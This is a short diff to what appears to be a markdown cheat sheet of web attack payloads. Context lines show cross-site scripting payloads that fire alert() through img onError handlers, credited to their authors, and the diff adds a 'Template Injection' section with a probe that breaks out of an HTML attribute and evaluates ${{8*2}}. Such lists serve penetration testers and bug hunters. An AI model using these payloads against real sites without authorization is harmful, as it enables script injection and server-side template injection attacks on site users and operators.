@@ -148,6 +148,12 @@ test",prompt%0A/*HelloWorld*/(document.domain) (working)- @Brutelogic
 <img/src=x onError="`${x}`;alert(`Ex.Mi`);"> -@ex_m
 ```
 
+## Template Injection
+
+```
+"><img src=x>${{8*2}}
+```
+
 ## Misc
 
 ```
